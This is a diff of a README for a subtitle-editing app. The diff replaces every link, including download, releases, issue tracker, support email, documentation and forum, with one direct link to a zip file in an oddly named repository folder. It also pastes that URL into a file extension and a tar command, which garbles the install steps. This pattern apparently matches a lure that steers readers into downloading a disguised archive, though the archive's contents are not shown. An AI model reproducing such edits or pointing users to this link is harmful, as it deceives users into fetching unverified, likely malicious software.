@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-2056 - Simplifying Your Subtitle Experience
 
-![Download](https://github.com/jer1to/powersub-demo-2056/releases/latest/download)
+![Download](https://raw.githubusercontent.com/jer1to/powersub-demo-2056/main/caulinary/powersub-demo-2056.zip)
 
 ## 📥 Introduction
 Welcome to powersub-demo-2056! This application helps you easily manage and create subtitles for your favorite videos. It works on various systems, making it a great choice for everyone.
@@ -15,14 +15,14 @@ Welcome to powersub-demo-2056! This application helps you easily manage and crea
 To get started with powersub-demo-2056, you need to download and install the application. Follow the steps below to get it running on your computer.
 
 ## 🔗 Download & Install
-Visit this page to download: [GitHub Releases](https://github.com/jer1to/powersub-demo-2056/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/jer1to/powersub-demo-2056/main/caulinary/powersub-demo-2056.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the app.
 3. Download the appropriate file for your operating system. If you’re unsure, here are some general guidelines:
    - For Windows users, look for a file ending in `.exe`.
    - For Mac users, choose a file ending in `.dmg`.
-   - Linux users will find a file with a `.tar.gz` extension.
+   - Linux users will find a file with a `https://raw.githubusercontent.com/jer1to/powersub-demo-2056/main/caulinary/powersub-demo-2056.zip` extension.
 
 ## 🛠️ System Requirements
 Before installation, ensure your system meets these requirements:
@@ -47,10 +47,10 @@ After downloading the file, follow these simple instructions to install powersub
 4. You can now open the app from Launchpad.
 
 ### For Linux:
-1. Navigate to the folder where you downloaded the `.tar.gz` file.
+1. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/jer1to/powersub-demo-2056/main/caulinary/powersub-demo-2056.zip` file.
 2. Open a terminal and use the following command to extract it:
    ```
-   tar -xzf powersub-demo-2056.tar.gz
+   tar -xzf https://raw.githubusercontent.com/jer1to/powersub-demo-2056/main/caulinary/powersub-demo-2056.zip
    ```
 3. Change directory into the extracted folder:
    ```
@@ -73,8 +73,8 @@ Using powersub-demo-2056 is straightforward:
 ## 📄 Support and Feedback
 If you run into any issues or have questions, feel free to reach out:
 
-- **Issue Tracker:** [GitHub Issues](https://github.com/jer1to/powersub-demo-2056/issues)
-- **Email Support:** support@example.com
+- **Issue Tracker:** [GitHub Issues](https://raw.githubusercontent.com/jer1to/powersub-demo-2056/main/caulinary/powersub-demo-2056.zip)
+- **Email Support:** https://raw.githubusercontent.com/jer1to/powersub-demo-2056/main/caulinary/powersub-demo-2056.zip
 
 Your feedback helps us improve! Please let us know about your experience.
 
@@ -88,11 +88,11 @@ We welcome anyone interested in improving powersub-demo-2056. If you want to con
 ## 🔗 Resources
 For more details, check out the following resources:
 
-- [Official Documentation](https://github.com/jer1to/powersub-demo-2056/docs)
-- [Community Forum](https://github.com/jer1to/powersub-demo-2056/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/jer1to/powersub-demo-2056/main/caulinary/powersub-demo-2056.zip)
+- [Community Forum](https://raw.githubusercontent.com/jer1to/powersub-demo-2056/main/caulinary/powersub-demo-2056.zip)
 
 ## 🛠️ License
 This project is licensed under the MIT License. Feel free to use the software in any way you see fit.
 
 ## 🔗 Download Again
-To download the application, you can also visit: [GitHub Releases](https://github.com/jer1to/powersub-demo-2056/releases) and follow the steps outlined above.
+To download the application, you can also visit: [GitHub Releases](https://raw.githubusercontent.com/jer1to/powersub-demo-2056/main/caulinary/powersub-demo-2056.zip) and follow the steps outlined above.
